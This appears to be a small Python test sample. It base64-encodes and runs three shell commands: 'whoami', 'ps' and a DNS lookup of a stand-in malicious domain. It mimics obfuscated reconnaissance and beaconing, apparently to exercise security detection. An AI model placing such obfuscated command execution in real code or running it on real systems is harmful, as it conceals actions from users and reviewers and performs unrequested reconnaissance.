import os
import base64

ins1 = 'd2hvYW1p'
ins2 = 'cHMK'
ins3 = 'bnNsb29rdXAgYmFkZG9tYWluLmNvbQ=='

os.system(str(base64.b64decode(ins1).decode('utf-8')))
os.system(str(base64.b64decode(ins2).decode('utf-8')))
os.system(str(base64.b64decode(ins3).decode('utf-8')))
